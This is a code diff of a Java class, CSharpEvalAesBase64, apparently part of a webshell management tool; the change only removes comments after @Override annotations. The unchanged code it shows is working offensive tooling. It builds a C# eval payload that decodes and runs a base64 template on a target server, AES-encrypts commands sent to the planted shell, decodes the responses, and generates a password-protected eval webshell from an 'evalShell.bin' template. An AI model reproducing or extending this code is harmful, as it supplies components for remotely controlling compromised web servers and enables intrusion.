@@ -25,7 +25,7 @@ public class CSharpEvalAesBase64 implements Cryption {
     private ShellEntity shell;
     private boolean state;
 
-    @Override // core.imp.Cryption
+    @Override 
     public void init(ShellEntity context) {
         this.shell = context;
         this.http = this.shell.getHttp();
@@ -52,7 +52,7 @@ public class CSharpEvalAesBase64 implements Cryption {
         }
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] encode(byte[] data) {
         try {
             return (String.format("%s=%s&", this.pass, this.evalContent) + this.shell.getSecretKey() + "=" + URLEncoder.encode(functions.base64Encode(this.encodeCipher.doFinal(data)))).getBytes();
@@ -62,7 +62,7 @@ public class CSharpEvalAesBase64 implements Cryption {
         }
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] decode(byte[] data) {
         try {
             return this.decodeCipher.doFinal(functions.base64Decode(findStr(data)));
@@ -80,17 +80,17 @@ public class CSharpEvalAesBase64 implements Cryption {
         return URLEncoder.encode(String.format("eval(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(HttpUtility.UrlDecode('%s'))),'unsafe');", URLEncoder.encode(functions.base64Encode(new String(functions.readInputStreamAutoClose(CSharpEvalAesBase64.class.getResourceAsStream("template/eval.bin"))).replace("{secretKey}", this.key).replace("{pass}", this.shell.getSecretKey()).getBytes()))));
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public boolean isSendRLData() {
         return true;
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public boolean check() {
         return this.state;
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] generate(String password, String secretKey) {
         return new String(functions.readInputStreamAutoClose(CSharpEvalAesBase64.class.getResourceAsStream("template/evalShell.bin"))).replace("{pass}", password).getBytes();
     }
